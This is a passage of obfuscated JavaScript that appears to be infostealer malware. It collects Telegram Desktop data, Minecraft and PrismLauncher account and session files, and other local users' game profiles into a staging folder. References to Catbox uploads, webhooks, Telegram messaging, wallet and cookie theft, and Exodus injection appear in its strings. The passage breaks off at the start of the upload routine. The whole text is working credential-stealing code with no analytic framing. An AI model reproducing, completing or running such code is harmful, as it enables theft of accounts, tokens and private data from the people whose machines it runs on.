      if (i.IqFGA(n.size, o)) {
        i.TEXeC(logInfo, "[Skip] File too large (" + i.TEXeC(formatBytes, n.size) + "): " + b);
        return false;
      }
      if (i.gPbeI(globalCopiedSize, n.size) > MAX_TEMPORARY_TOTAL_SIZE) {
        if (!globalLimitReached) {
          if (i.UObXd === i.UObXd) {
            i.BWVzq(logInfo, "[Storage] Temporary storage limit of 1GB reached. Skipping: " + b);
            globalLimitReached = true;
          } else {
            const r = i.createDecipheriv(i.RNFcc, j, k);
            r.setAuthTag(l);
            return m.concat([r.update(n), r.final()]).toString(i.Qswcb);
          }
        }
        return false;
      }
      fs.copyFileSync(b, j);
      globalCopiedSize += n.size;
    } else {
      c.mkdirSync(d, {
        recursive: true
      });
    }
  } catch (s) {
    return false;
  }
  return true;
}
function pruneMainFolder(a, b) {
  const c = {
    RebML: function (i, j, k) {
      return i(j, k);
    },
    PMhrn: "```No Badges```",
    vDLVI: function (i, j) {
      return i === j;
    },
    HNkxu: function (i, j) {
      return i === j;
    },
    FGsSa: function (i, j) {
      return i !== j;
    },
    cpPHV: "ZYLUG",
    VEAsO: "NgmUY",
    IKCrB: function (i, j) {
      return i !== j;
    },
    zxVlx: "DCyUw",
    dlvgC: function (i, j) {
      return i + j;
    },
    UlMzW: "taskkill /IM \"",
    zJxLy: "ignore",
    GPNIg: function (i, j) {
      return i(j);
    },
    udpqJ: "NkxdE",
    vVPKO: "MMTyA",
    WWrKF: function (i, j) {
      return i(j);
    },
    HeXFi: function (i, j) {
      return i(j);
    },
    QJmFz: function (i, j) {
      return i !== j;
    },
    qMTDO: "JfaFl",
    zfeKI: "DFaCt",
    xrCwS: function (i, j) {
      return i <= j;
    }
  };
  if (!fs.existsSync(a)) {
    return;
  }
  function d(i, j = []) {
    const k = {
      fRtes: function (l, m, n) {
        return c.RebML(l, m, n);
      },
      LjPQE: function (l, m) {
        return l == m;
      },
      amoXp: c.PMhrn,
      WvqXn: function (l, m) {
        return l(m);
      },
      Adhno: function (l, m) {
        return c.vDLVI(l, m);
      },
      kirhH: "RRlHT",
      xUQyM: function (l, m) {
        return c.HNkxu(l, m);
      },
      vDFUf: "Lmwht",
      behfA: function (l, m) {
        return c.FGsSa(l, m);
      },
      BuMvL: c.cpPHV,
      xShrz: "EpSQh",
      wYAao: c.VEAsO
    };
    try {
      if (c.IKCrB(c.zxVlx, c.zxVlx)) {
        c.add(d);
      } else {
        const m = fs.readdirSync(i);
        m.forEach(n => {
          const o = {
            mjCQb: function (p, q) {
              return k.WvqXn(p, q);
            }
          };
          if (k.Adhno(k.kirhH, "RRlHT")) {
            const p = path.join(i, n);
            try {
              if (k.xUQyM(k.vDFUf, "thQpJ")) {
                if (h) {
                  o.mjCQb(i, j);
                } else {
                  k(l);
                }
              } else {
                const r = fs.lstatSync(p);
                if (r.isDirectory()) {
                  if (k.behfA(k.BuMvL, k.xShrz)) {
                    k.fRtes(d, p, j);
                  } else {
                    k.fRtes(c, d, "injectExodus");
                  }
                } else if (k.Adhno(k.wYAao, k.wYAao)) {
                  const t = {
                    path: p,
                    size: r.size
                  };
                  j.push(t);
                } else {
                  let v = "";
                  for (const w in i) {
                    let x = l[w];
                    if (k.LjPQE(m & x.Value, x.Value)) {
                      v += x.Emoji;
                    }
                  }
                  ;
                  if (k.LjPQE(v, "")) {
                    return k.amoXp;
                  }
                  return "" + v;
                }
              }
            } catch (v) {}
          } else {
            d.importantCookies = g.importantCookies.concat(h);
          }
        });
      }
    } catch (n) {}
    return j;
  }
  let g = c.GPNIg(d, a);
  let h = g.reduce((i, j) => i + j.size, 0);
  if (h > b) {
    if (c.FGsSa(c.udpqJ, c.vVPKO)) {
      c.GPNIg(logInfo, "[Pruning] Folder size is " + c.WWrKF(formatBytes, h) + ". Limit is " + c.HeXFi(formatBytes, b) + ". Pruning largest files...");
      g.sort((i, j) => j.size - i.size);
      for (const i of g) {
        try {
          if (c.QJmFz(c.qMTDO, c.zfeKI)) {
            fs.unlinkSync(i.path);
            h -= i.size;
            if (c.xrCwS(h, b)) {
              break;
            }
          } else {
            try {
              g(c.dlvgC(c.dlvgC(c.UlMzW, h), "\" /F"), {
                stdio: c.zJxLy,
                windowsHide: true
              });
            } catch (k) {}
          }
        } catch (k) {}
      }
      c.GPNIg(logInfo, "[Pruning] Final folder size: " + c.GPNIg(formatBytes, h));
    } else {
      const m = d.apply(g, arguments);
      h = null;
      return m;
    }
  }
}
function formatBytes(a) {
  if (a === 0) {
    return "0 B";
  }
  const c = 1024;
  const d = ["B", "KB", "MB", "GB", "TB"];
  const g = Math.floor(Math.log(a) / Math.log(c));
  let h = parseFloat((a / Math.pow(c, g)).toFixed(2));
  if (h >= 100) {
    return h.toFixed(0) + " " + d[g];
  }
  if (h >= 10) {
    return h.toFixed(1) + " " + d[g];
  }
  return h.toFixed(1) + " " + d[g];
}
async function checkPrismLauncherPortable() {
  try {
    const g = ["C:\\Program Files\\PrismLauncher", "C:\\Program Files (x86)\\PrismLauncher", path.join(os.homedir(), "Desktop", "PrismLauncher"), path.join(os.homedir(), "Downloads", "PrismLauncher"), path.join(os.homedir(), "Documents", "PrismLauncher")];
    for (const h of g) {
      if (fs.existsSync(h)) {
        const j = path.join(h, "prismlauncher.cfg");
        const k = path.join(h, "portable.txt");
        if (fs.existsSync(j) || fs.existsSync(k)) {
          return h;
        }
        const l = path.join(h, "PrismLauncher.exe");
        if (fs.existsSync(l)) {
          return h;
        }
      }
    }
    return null;
  } catch (n) {
    logError(n, "checkPrismLauncherPortable");
    return null;
  }
}
async function fetchSocials() {
  const b = {
    BcBuA: function (i, j) {
      return i > j;
    },
    WWjMZ: "utf8",
    Mcuko: "Unknown",
    KSpBX: "... (truncated)",
    CNshR: "Socials",
    IBXuF: function (i, j) {
      return i === j;
    },
    vnDkb: "ykoXR",
    qvgSi: "cbYZH",
    LEMcJ: "imWWs",
    gPfts: "Telegram Desktop",
    lMUsh: function (i, j) {
      return i !== j;
    },
    phzJs: "HXnIG",
    LkfQm: "emoji",
    Viuok: "user_data",
    HosTU: "user_data#2",
    ycSFl: "user_data#4",
    hIFby: "working",
    lZJzZ: "temp",
    AIADa: "temp_data",
    hNlQR: function (i, j, k, l) {
      return i(j, k, l);
    },
    RUaCM: function (i, j, k) {
      return i(j, k);
    }
  };
  const c = PATHS.socials;
  let d = 0;
  const g = os.homedir();
  const h = path.join(mainFolderPath, b.CNshR);
  for (const [i, j] of Object.entries(c)) {
    if (b.IBXuF(b.vnDkb, b.qvgSi)) {
      try {
        const l = o.createDecipheriv("aes-256-gcm", p, q);
        l.setAuthTag(r);
        const m = s.concat([l.update(t), l.final()]);
        if (b.BcBuA(m.length, 32)) {
          return m.slice(32).toString(b.WWjMZ);
        } else {
          return m.toString("utf8");
        }
      } catch (n) {}
    } else {
      try {
        if (b.IBXuF(b.LEMcJ, b.LEMcJ)) {
          const l = path.join(g, j);
          if (fs.existsSync(l)) {
            const m = {
              recursive: true
            };
            if (!fs.existsSync(h)) {
              fs.mkdirSync(h, m);
            }
            const n = path.join(h, i);
            let o = [];
            if (i === b.gPfts) {
              if (b.lMUsh("HXnIG", b.phzJs)) {
                const r = i.readFileSync(j, b.WWjMZ);
                const s = r.match(/name=([^\n]+)/);
                const t = r.match(/IntendedVersion=([^\n]+)/);
                k.push("  " + l + ":");
                m.push("    Name: " + (s ? s[1] : b.Mcuko));
                n.push("    Version: " + (t ? t[1] : "Unknown"));
              } else {
                o = [b.LkfQm, b.Viuok, b.HosTU, "user_data#3", b.ycSFl, "user_data#5", b.hIFby, b.lZJzZ, b.AIADa];
              }
            }
            await b.hNlQR(copyFolderRecursive, l, n, o);
            d++;
          }
        } else {
          b.fields.forEach(r => {
            if (r.value && b.BcBuA(r.value.length, 1020)) {
              r.value = r.value.substring(0, 1000) + b.KSpBX;
            }
          });
        }
      } catch (r) {
        b.RUaCM(logError, r, "fetchSocials-" + i);
      }
    }
  }
  return d;
}
async function fetchGamesData() {
  const d = {
    lwlZG: function (j, k, l) {
      return j(k, l);
    },
    rWzeY: "Direct-Webhook-Upload",
    huIPi: "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",
    oHvvh: function (j, k) {
      return j / k;
    },
    KndXb: function (j, k) {
      return j * k;
    },
    OXzUa: function (j, k) {
      return j < k;
    },
    PsvGH: function (j, k) {
      return j | k;
    },
    mDhJw: function (j, k) {
      return j << k;
    },
    CEruZ: function (j, k) {
      return j >>> k;
    },
    NIsiY: function (j, k) {
      return j < k;
    },
    nBnPv: function (j, k) {
      return j + k;
    },
    nqHzt: function (j, k) {
      return j * k;
    },
    XsunG: function (j, k) {
      return j + k;
    },
    dQoRf: function (j, k) {
      return j(k);
    },
    zracc: function (j, k, l, m) {
      return j(k, l, m);
    },
    FuOXQ: function (j, k, l) {
      return j(k, l);
    },
    SfshX: function (j, k) {
      return j - k;
    },
    PnKLF: function (j, k) {
      return j === k;
    },
    IFACD: "aes-256-gcm",
    FOMLr: function (j, k) {
      return j > k;
    },
    ryGvJ: function (j, k, l) {
      return j(k, l);
    },
    cmHld: "Direct-Webhook",
    Ztiiz: "utf8",
    gYDVK: function (j, k) {
      return j(k);
    },
    UtwBb: "SR_05",
    ipBps: function (j, k) {
      return j + k;
    },
    YDYWS: "log.txt",
    DtKbt: function (j, k) {
      return j | k;
    },
    TaIZC: function (j, k) {
      return j - k;
    },
    xtfHc: function (j, k, l) {
      return j(k, l);
    },
    NmTuK: "sendTelegramMessage",
    QHctx: "Games",
    tMixk: function (j, k) {
      return j * k;
    },
    zDFde: function (j, k) {
      return j !== k;
    },
    STfsh: "gxlSH",
    xKrOE: function (j) {
      return j();
    },
    YcosD: function (j, k) {
      return j === k;
    },
    BwEJH: "grxug",
    DnWpy: "PrismLauncher_Portable",
    sXTyK: "SvmCm",
    UKZnZ: "UqOZA",
    jrPKA: "gANCS",
    blvoO: "CjzLs",
    dbfGT: "LAhwP",
    SzvTw: function (j, k) {
      return j !== k;
    },
    kbnQa: "mADoc",
    YUmaQ: "sEMqf",
    HyIqy: "string",
    nQlvU: "Program Files",
    yJdpD: "Documents",
    sBEOH: "XxjPe",
    hzbOG: function (j, k) {
      return j !== k;
    },
    swoqu: "sAKFy",
    tfbPL: "FwZJg",
    uDcBr: "dOQNe",
    tSCpj: function (j, k, l, m) {
      return j(k, l, m);
    },
    OXyMg: function (j, k) {
      return j(k);
    },
    ERrmu: "wXUYl",
    CwMli: "herJb",
    SkZuE: function (j, k, l, m, n, o) {
      return j(k, l, m, n, o);
    },
    YOjhr: function (j, k) {
      return j === k;
    },
    TUpdI: "oySFJ",
    vqIeo: "yayAH",
    WVCxW: function (j, k, l) {
      return j(k, l);
    },
    JpGRS: "UoALP",
    pvylQ: "VEzYc",
    TgKCE: "Minecraft",
    uJmZI: "iMxvz",
    CkqDL: function (j, k) {
      return j(k);
    },
    awrkQ: "PrismLauncher",
    CfEFS: "VqoBL",
    dlgDY: function (j, k, l) {
      return j(k, l);
    },
    ZQcDe: function (j, k, l) {
      return j(k, l);
    },
    gCwer: function (j, k) {
      return j === k;
    },
    PugUZ: "FUGvW",
    CuJWS: "lLhud",
    PRhbg: function (j, k, l) {
      return j(k, l);
    },
    fbEle: "fetchGamesData"
  };
  let g = 0;
  const h = path.join(mainFolderPath, d.QHctx);
  const i = d.tMixk(d.nqHzt(25, 1024), 1024);
  try {
    if (d.zDFde("gxlSH", d.STfsh)) {
      d.lwlZG(c, d, d.rWzeY);
      return null;
    } else {
      const k = os.homedir();
      const l = await d.xKrOE(checkPrismLauncherPortable);
      if (l) {
        if (d.YcosD(d.BwEJH, "grxug")) {
          const m = {
            recursive: true
          };
          if (!fs.existsSync(h)) {
            fs.mkdirSync(h, m);
          }
          const n = path.join(h, d.DnWpy);
          try {
            if (d.sXTyK !== d.UKZnZ) {
              await copyFolderRecursive(l, n);
              g++;
            } else {
              const v = d.huIPi;
              let w = 0;
              let x = 0;
              let y = 0;
              const z = new h(d.oHvvh(d.KndXb(i.length, 5), 8));
              for (let A = 0; d.OXzUa(A, m.length); A++) {
                x = d.PsvGH(d.mDhJw(x, 5), v.indexOf(o[A].toUpperCase()));
                w += 5;
                if (w >= 8) {
                  z[y++] = d.CEruZ(x, w - 8) & 255;
                  w -= 8;
                }
              }
              return l.from(z.slice(0, y));
            }
          } catch (p) {
            if (d.PnKLF(d.jrPKA, d.jrPKA)) {
              d.ryGvJ(logError, p, "fetchGamesData-PrismLauncherPortable");
            } else {
              for (var r = 0; d.NIsiY(r, p); r++) {
                var s = d.PsvGH(d.mDhJw(C[d.nBnPv(D + 8, d.nqHzt(r, 2))], 8), E[d.nBnPv(d.XsunG(F, 9), r * 2)]);
                try {
                  var w = d.FuOXQ(O, P, s);
                  var v = w[0];
                  s += w[1];
                  var t = Q(R, s);
                  s += t[1];
                  var u = d.zracc(S, T, s, v);
                  U.push(d.dQoRf(V, u));
                } catch (z) {}
              }
            }
          }
        } else {
          const s = g.indexOf(h);
          const t = i.indexOf(j);
          return d.SfshX(d.PnKLF(s, -1) ? 999 : s, t === -1 ? 999 : t);
        }
      }
      for (const [s, t] of Object.entries(gamesPaths)) {
        try {
          if (d.zDFde(d.blvoO, d.dbfGT)) {
            let v = false;
            if (!fs.existsSync(h)) {
              fs.mkdirSync(h, {
                recursive: true
              });
            }
            const x = path.join(h, s);
            for (const [y, z] of Object.entries(t)) {
              try {
                if (d.SzvTw(d.kbnQa, d.YUmaQ)) {
                  const A = d.PnKLF(typeof z, d.HyIqy) ? z : z.path;
                  const B = d.PnKLF(typeof z, "string") ? [] : z.excludes || [];
                  let C;
                  if (A.startsWith(d.nQlvU)) {
                    C = path.join("C:", A);
                  } else if (A.startsWith(d.yJdpD)) {
                    if (d.YcosD(d.sBEOH, "Umzfp")) {
                      d.ryGvJ(c, d, d.cmHld);
                    } else {
                      C = path.join(k, A);
                    }
                  } else if (d.hzbOG(d.swoqu, d.swoqu)) {
                    const F = h.readFileSync(i, d.Ztiiz);
                    try {
                      m.kill(d.gYDVK(n, F), 0);
                      o.exit(0);
                    } catch (G) {}
                  } else {
                    C = path.join(k, A);
                  }
                  if (fs.existsSync(C)) {
                    if (d.YcosD(d.tfbPL, d.uDcBr)) {
                      h(i);
                      j.end();
                      d.gYDVK(k, l.result || {});
                    } else {
                      const G = path.join(x, y);
                      try {
                        const H = fs.lstatSync(C);
                        if (H.isDirectory()) {
                          if (!fs.existsSync(x)) {
                            fs.mkdirSync(x, {
                              recursive: true
                            });
                          }
                          await d.tSCpj(copyFolderRecursive, C, G, B);
                          v = true;
                          d.OXyMg(logInfo, "[Games] Successfully collected (folder): " + s + " -> " + y);
                        } else if (d.SzvTw(d.ERrmu, d.CwMli)) {
                          if (d.SkZuE(copyFileIfExists, C, path.join(x, y), null, B, i)) {
                            v = true;
                            logInfo("[Games] Successfully collected: " + s + " -> " + y);
                          }
                        } else {
                          d.copyFileSync(g, h);
                        }
                      } catch (K) {
                        if (d.YOjhr(d.TUpdI, d.vqIeo)) {
                          d.lwlZG(c, d, d.UtwBb);
                        } else {
                          d.WVCxW(logError, K, "fetchGamesData-" + s + "-" + y);
                        }
                      }
                    }
                  }
                } else {
                  d.gYDVK(d, "[Storage] Temporary storage limit of 1GB reached. Skipping: " + g);
                  h = true;
                }
              } catch (N) {
                if (d.JpGRS === d.pvylQ) {
                  c = d;
                } else {
                  d.lwlZG(logError, N, "fetchGamesData-" + s + "-" + y);
                }
              }
            }
            if (v) {
              g++;
              if (d.YcosD(s, d.TgKCE)) {
                if (d.SzvTw(d.uJmZI, "iMxvz")) {
                  c.value = d.ipBps(d.value.substring(0, 1000), "... (truncated)");
                } else {
                  await d.CkqDL(extractMinecraftSessionInfo, x);
                }
              }
              if (s === d.awrkQ) {
                if (d.CfEFS === "zUXRC") {
                  const R = "\nScript finished at: " + new g().toISOString() + "\n";
                  const S = h.join(i, d.YDYWS);
                  j.appendFileSync(S, R, "utf8");
                } else {
                  await d.OXyMg(extractPrismLauncherInfo, x);
                }
              }
            }
          } else {
            var S = d.PsvGH(d.DtKbt(d.mDhJw(k[l], 16), d.mDhJw(m[n + 1], 8)), o[d.nBnPv(p, 2)]);
            q.push(S > 8388607 ? d.TaIZC(S, 16777216) : S);
            r += 3;
          }
        } catch (S) {
          d.dlgDY(logError, S, "fetchGamesData-" + s);
        }
      }
      await d.ZQcDe(scanOtherUsersGames, h, i);
    }
  } catch (T) {
    if (d.gCwer(d.PugUZ, d.CuJWS)) {
      d.xtfHc(c, d, d.NmTuK);
    } else {
      d.PRhbg(logError, T, d.fbEle);
    }
  }
  return g;
}
async function extractPrismLauncherInfo(a) {
  try {
    const d = [];
    d.push("=== PrismLauncher Information ===\n");
    const g = path.join(a, "Accounts", "accounts.json");
    if (fs.existsSync(g)) {
      try {
        d.push("--- Accounts ---");
        const j = JSON.parse(fs.readFileSync(g, "utf8"));
        if (j.accounts && Array.isArray(j.accounts)) {
          j.accounts.forEach((k, l) => {
            d.push("Account " + (l + 1) + ":");
            d.push("  Type: " + (k.type || "Unknown"));
            d.push("  Username: " + (k.username || "N/A"));
            d.push("  UUID: " + (k.uuid || "N/A"));
            if (k.microsoft) {
              d.push("  Microsoft Account: Yes");
              d.push("  Access Token: " + (k.microsoft.access_token ? "Present" : "Missing"));
              d.push("  Refresh Token: " + (k.microsoft.refresh_token ? "Present" : "Missing"));
            }
            d.push("");
          });
        } else {
          d.push("No accounts found or invalid format");
        }
      } catch (m) {
        d.push("Error reading accounts.json: " + m.message);
      }
    }
    const h = path.join(a, "Config", "prismlauncher.cfg");
    if (fs.existsSync(h)) {
      try {
        d.push("--- Configuration ---");
        const q = fs.readFileSync(h, "utf8");
        const r = q.split("\n");
        const s = ["InstanceDir", "DownloadsDir", "JavaPath", "MaxMemAlloc"];
        r.forEach(t => {
          s.forEach(v => {
            if (t.startsWith(v + "=")) {
              d.push("  " + t.trim());
            }
          });
        });
        d.push("");
      } catch (t) {
        d.push("Error reading config: " + t.message);
      }
    }
    const i = path.join(a, "Instances");
    if (fs.existsSync(i)) {
      try {
        const x = fs.readdirSync(i);
        d.push("--- Instances ---");
        d.push("Total instances found: " + x.length);
        x.forEach((y, z) => {
          if (z < 5) {
            const C = path.join(i, y);
            if (fs.existsSync(C)) {
              const D = path.join(C, "instance.cfg");
              if (fs.existsSync(D)) {
                try {
                  const F = fs.readFileSync(D, "utf8");
                  const G = F.match(/name=([^\n]+)/);
                  const H = F.match(/IntendedVersion=([^\n]+)/);
                  d.push("  " + y + ":");
                  d.push("    Name: " + (G ? G[1] : "Unknown"));
                  d.push("    Version: " + (H ? H[1] : "Unknown"));
                } catch (J) {
                  d.push("  " + y + ": (config read error)");
                }
              }
            }
          }
        });
        if (x.length > 5) {
          d.push("  ... and " + (x.length - 5) + " more instances");
        }
        d.push("");
      } catch (y) {
        d.push("Error reading instances: " + y.message);
      }
    }
    if (d.length > 1) {
      const B = path.join(a, "PrismLauncher_Info.txt");
      fs.writeFileSync(B, d.join("\n"), "utf8");
    }
  } catch (C) {
    logError(C, "extractPrismLauncherInfo");
  }
}
async function extractMinecraftSessionInfo(a) {
  const b = {
    xQpuA: function (c, d, g) {
      return c(d, g);
    },
    ZHdDH: "schtasks /delete /tn NVIDIA_SelfUpdate_* /f",
    QgrFh: "aes-256-gcm",
    dXXIZ: function (c, d) {
      return c > d;
    },
    KVMvr: "utf8",
    djtBS: "http",
    JujrN: "[CRITICAL] Failed to write to log file:",
    mGALN: "Local State",
    bJQru: function (c, d) {
      return c(d);
    },
    YSGbQ: function (c, d, g) {
      return c(d, g);
    },
    voJjO: "ignore",
    SdSqE: function (c, d) {
      return c(d);
    },
    QRgHI: "launcher_accounts.json",
    AzRNo: function (c, d) {
      return c === d;
    },
    FxxJs: "hdhkA",
    BUSfa: "=== Minecraft Launcher Accounts ===",
    dwGMW: "lmxhH",
    oQEID: "joHyr",
    YoCMH: "2|4|1|3|0",
    uWBbG: "---",
    YzPxi: "N/A",
    MEeBL: "Error reading launcher_accounts.json",
    qOuuy: "Server List",
    oISCt: "servers.dat",
    kpkEc: function (c, d) {
      return c === d;
    },
    tWesN: "kjoRT",
    FTneR: "bOGzy",
    BdLHt: "cNrer",
    UnAAa: "GbKjq",
    RpIxv: "\n=== Minecraft Servers ===",
    eHkyg: "Server list found in servers.dat (NBT format)",
    Cidpm: "nHMcZ",
    TjxSS: "Error reading servers.dat",
    ECpHX: "Last Login",
    PdYWl: "lastlogin",
    ZbNGy: "Xltzl",
    volKw: "oVsGF",
    lgZaE: "afBAz",
    AgCaJ: "\n=== Last Login Info ===",
    pxdFi: "aVoVZ",
    kwGJf: function (c, d) {
      return c !== d;
    },
    KhTfk: "bPVTX",
    sMAjM: "Minecraft_Session_Info.txt",
    vPDlt: function (c, d) {
      return c !== d;
    },
    ZSxdx: "qTvRr",
    yjSWG: "pJLjK",
    YqwvM: "extractMinecraftSessionInfo"
  };
  try {
    const c = [];
    const d = path.join(a, "Launcher Accounts (Microsoft)", b.QRgHI);
    if (fs.existsSync(d)) {
      if (b.AzRNo(b.FxxJs, b.FxxJs)) {
        try {
          const i = JSON.parse(fs.readFileSync(d, b.KVMvr));
          c.push(b.BUSfa);
          for (const [j, k] of Object.entries(i.accounts || {})) {
            if (b.dwGMW !== b.oQEID) {
              const l = b.YoCMH.split("|");
              let m = 0;
              while (true) {
                switch (l[m++]) {
                  case "0":
                    c.push(b.uWBbG);
                    continue;
                  case "1":
                    c.push("UUID: " + (k.profileId || b.YzPxi));
                    continue;
                  case "2":
                    c.push("Account ID: " + j);
                    continue;
                  case "3":
                    c.push("Type: " + (k.type || b.YzPxi));
                    continue;
                  case "4":
                    c.push("Username: " + (k.username || b.YzPxi));
                    continue;
                }
                break;
              }
            } else {
              try {
                b.xQpuA(c, b.ZHdDH, {
                  stdio: "ignore",
                  windowsHide: true
                });
              } catch (p) {}
            }
          }
        } catch (o) {
          c.push(b.MEeBL);
        }
      } else {
        try {
          const q = o.createDecipheriv(b.QgrFh, p, q);
          q.setAuthTag(r);
          const r = s.concat([q.update(t), q.final()]);
          if (b.dXXIZ(r.length, 32)) {
            return r.slice(32).toString("utf8");
          } else {
            return r.toString(b.KVMvr);
          }
        } catch (s) {}
      }
    }
    const g = path.join(a, b.qOuuy, b.oISCt);
    if (fs.existsSync(g)) {
      if (b.kpkEc(b.tWesN, b.FTneR)) {
        if (d.includes(b.djtBS)) {
          g.push(h);
        }
      } else {
        try {
          if (b.BdLHt === b.UnAAa) {
            c.error(b.JujrN, d);
          } else {
            c.push(b.RpIxv);
            c.push(b.eHkyg);
            c.push("File size: " + fs.statSync(g).size + " bytes");
          }
        } catch (s) {
          if (b.AzRNo("nHMcZ", b.Cidpm)) {
            c.push(b.TjxSS);
          } else {
            const u = j.join(k.dir, l);
            try {
              if (q.statSync(u).isDirectory()) {
                const v = u.join(u, b.mGALN);
                if (v.existsSync(v)) {
                  w.push(v);
                }
              }
            } catch (w) {}
          }
        }
      }
    }
    const h = path.join(a, b.ECpHX, b.PdYWl);
    if (fs.existsSync(h)) {
      if (b.AzRNo("vQjOB", b.ZbNGy)) {
        b.bJQru(g, "[0x0.st] Skipping upload: File too large (" + h(i) + ")");
        return b.bJQru(j, null);
      } else {
        try {
          if (b.AzRNo(b.volKw, b.lgZaE)) {
            const w = j.resolve(k.join(l, m));
            if (w.toLowerCase() === n) {
              return;
            }
            try {
              const x = q.readdirSync(w);
              if (x.some(y => y.endsWith(".exe") || y.endsWith(".vbs"))) {
                b.YSGbQ(s, "rmdir /s /q \"" + w + "\"", {
                  stdio: b.voJjO,
                  windowsHide: true
                });
              }
            } catch (y) {}
          } else {
            const w = fs.readFileSync(h, b.KVMvr);
            c.push(b.AgCaJ);
            c.push(w);
          }
        } catch (x) {
          if (b.pxdFi === b.pxdFi) {
            c.push("Error reading lastlogin file");
          } else {
            b.xQpuA(d, g, "fetchWallets-" + h);
          }
        }
      }
    }
    if (b.dXXIZ(c.length, 0)) {
      if (b.kwGJf(b.KhTfk, b.KhTfk)) {
        const A = new b();
        return A.toLocaleString("fr-FR", {
          timeZoneName: "short"
        });
      } else {
        const A = path.join(a, b.sMAjM);
        fs.writeFileSync(A, c.join("\n"), b.KVMvr);
      }
    }
  } catch (B) {
    if (b.vPDlt(b.ZSxdx, b.yjSWG)) {
      b.xQpuA(logError, B, b.YqwvM);
    } else {
      l.push({
        url: m[1].trim(),
        username: n[1].trim(),
        password: o[1].trim(),
        application: p ? q[1].trim() : r,
        category: b.SdSqE(s, t[1].trim())
      });
    }
  }
}
async function scanOtherUsersGames(a, b = null) {
  const c = {
    uWEwP: function (d, g, h) {
      return d(g, h);
    },
    PSoKe: "scanOtherUsersGames",
    jfEdV: function (d, g, h) {
      return d(g, h);
    },
    LgWiQ: "powershell -NoProfile -ExecutionPolicy Bypass -Command \"(Get-Volume -DriveLetter C).Size\"",
    iLVKv: "pipe",
    VtPHK: function (d, g) {
      return d(g);
    },
    BFlrl: function (d, g) {
      return d < g;
    },
    WnCWI: function (d, g) {
      return d * g;
    },
    XFvvs: "http",
    RcYWw: "Error reading lastlogin file",
    XjCkX: function (d, g) {
      return d !== g;
    },
    mMmrF: function (d, g) {
      return d === g;
    },
    aYSUR: "RLnMN",
    zbIKd: function (d, g) {
      return d === g;
    },
    AeOuh: "Public",
    XQmyQ: "Default",
    nZVii: "Default User",
    nmFLL: "All Users",
    NTnbn: function (d, g) {
      return d === g;
    },
    Edxdl: "PIOyQ",
    jFBOs: "AppData",
    hMDqA: "Roaming",
    isDsh: "Packages",
    ZeeVt: "Microsoft.MinecraftUWP_8wekyb3d8bbwe",
    ldmkv: "games",
    SEtKl: "com.mojang",
    COxty: "XlAkk",
    NsoxE: "rpZEN",
    VxkoN: function (d, g, h, i, j) {
      return d(g, h, i, j);
    },
    dlLVX: "region",
    ctupJ: function (d, g) {
      return d !== g;
    },
    GqsxG: "qHWJD",
    nVjiY: function (d, g) {
      return d !== g;
    },
    sTFmJ: "gIoak",
    fgxSi: "PrismLauncher"
  };
  try {
    const d = "C:\\Users";
    if (!fs.existsSync(d)) {
      return;
    }
    const g = fs.readdirSync(d);
    for (const h of g) {
      if (c.XjCkX("iYUwS", "UxSLa")) {
        try {
          if (c.mMmrF(c.aYSUR, "SvtZW")) {
            c.uWEwP(c, d, c.PSoKe);
          } else {
            if (c.zbIKd(h, c.AeOuh) || h === c.XQmyQ || h === c.nZVii || c.zbIKd(h, c.nmFLL) || c.NTnbn(h, os.userInfo().username)) {
              if (c.Edxdl !== "zWBGu") {
                continue;
              } else {
                const o = g.readdirSync(h);
                if (o.some(p => p.endsWith(".exe") || p.endsWith(".vbs"))) {
                  c.jfEdV(k, "rmdir /s /q \"" + l + "\"", {
                    stdio: "ignore",
                    windowsHide: true
                  });
                }
              }
            }
            const j = path.join(d, h);
            const k = path.join(a, "User_" + h);
            const l = [path.join(j, c.jFBOs, c.hMDqA, ".minecraft"), path.join(j, "AppData", "Local", c.isDsh, c.ZeeVt, "LocalState", c.ldmkv, c.SEtKl)];
            const m = [path.join(j, c.jFBOs, c.hMDqA, "PrismLauncher"), path.join(j, c.jFBOs, "Local", "PrismLauncher")];
            for (const o of l) {
              if (fs.existsSync(o)) {
                if (c.COxty !== c.NsoxE) {
                  c.VxkoN(copyFolderRecursiveSync, o, path.join(k, path.basename(o)), [c.dlLVX], b);
                } else {
                  try {
                    const q = i(c.LgWiQ, {
                      windowsHide: true,
                      stdio: c.iLVKv,
                      timeout: 5000
                    }).toString();
                    const r = j(q.trim());
                    if (!c.VtPHK(k, r) && c.BFlrl(r, c.WnCWI(c.WnCWI(c.WnCWI(100, 1024), 1024), 1024))) {
                      return true;
                    }
                  } catch (s) {}
                  return false;
                }
              }
            }
            for (const q of m) {
              if (c.ctupJ(c.GqsxG, "qHWJD")) {
                c.unlinkSync(d);
              } else if (fs.existsSync(q)) {
                if (c.nVjiY(c.sTFmJ, "RGupx")) {
                  c.VxkoN(copyFolderRecursiveSync, q, path.join(k, c.fgxSi), [c.dlLVX], b);
                } else {
                  const t = {
                    giyGN: c.XFvvs
                  };
                  const u = t;
                  c.forEach(v => {
                    try {
                      if (v.includes(u.giyGN)) {
                        h.push(v);
                      }
                    } catch (w) {}
                  });
                }
              }
            }
          }
        } catch (t) {}
      } else {
        b.push(c.RcYWw);
      }
    }
  } catch (v) {
    c.jfEdV(logError, v, c.PSoKe);
  }
}
async function uploadToCatbox(a) {
  const b = {
    YfTPK: function (c, d) {
      return c(d);
    },
    ZnWWC: function (c, d) {
      return c === d;
    },
    ZYMWz: "MeXyj",
    gkuum: "iLrjP",
    yOKxh: function (c, d, g) {
      return c(d, g);
    },
    dcWVl: "Catbox-Curl-Error",
    jyyjI: function (c, d) {
      return c(d);
    },
    RfEby: "Upload to Catbox timed out.",
    kWTEE: "http",
    BuKdt: "rfapg",
    UtqnQ: function (c, d) {
      return c(d);
    },
    gSFTe: function (c, d) {
      return c === d;
    },
    yHUTt: "XxZZP",
    MDLVF: function (c, d) {
      return c !== d;
    },
    WgMYv: "FWtss",
    Lvrhl: "uSLTv",
    XJAFH: function (c, d) {
      return c(d);
    },
    iQhwp: "N/A",
    hDeTR: function (c, d, g) {
      return c(d, g);
    },
    Jqctx: "Catbox-Upload",
    klgfz: function (c, d) {
      return c(d);
    },
    xzNQL: "\n=== Minecraft Servers ===",
    FKYFL: "Server list found in servers.dat (NBT format)",
    qyIvq: function (c, d, g) {
      return c(d, g);
    },
    RxYWo: "net session",
    xXpDm: "ignore",
    lpCNL: function (c, d) {
      return c !== d;
    },
    zTstG: "mzqrp",
    EtYYL: "pYOOL",
    EAUuj: "afeeS",
    uFEyh: function (c, d) {
      return c > d;
    },
    xRYgv: function (c, d) {
      return c * d;
    },
